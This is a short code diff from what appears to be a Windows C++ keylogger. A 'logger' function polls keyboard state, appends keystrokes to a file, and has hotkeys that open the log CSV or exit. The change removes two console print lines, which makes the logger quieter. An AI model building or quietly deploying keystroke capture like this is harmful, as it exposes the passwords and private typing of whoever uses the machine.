@@ -25,7 +25,6 @@ int logger(int key, char *file)
     }
     if (GetAsyncKeyState(VK_CONTROL) & 0x8000 && GetAsyncKeyState(VK_SHIFT) & 0x8000 && GetAsyncKeyState('G') & 0x8000)
     {
-        cout << "opening" << endl;
         ShellExecute(0, "open", "log.csv", 0, 0, SW_SHOW);
     }
     if (GetAsyncKeyState(VK_CONTROL) & 0x8000 && GetAsyncKeyState(VK_SHIFT) & 0x8000 && GetAsyncKeyState('Q') & 0x8000)
@@ -33,7 +32,6 @@ int logger(int key, char *file)
         exit(0);
     }
 
-    cout << key << endl;
     Sleep(10);
     FILE *OUTPUT_FILE;
     OUTPUT_FILE = fopen(file, "a+");
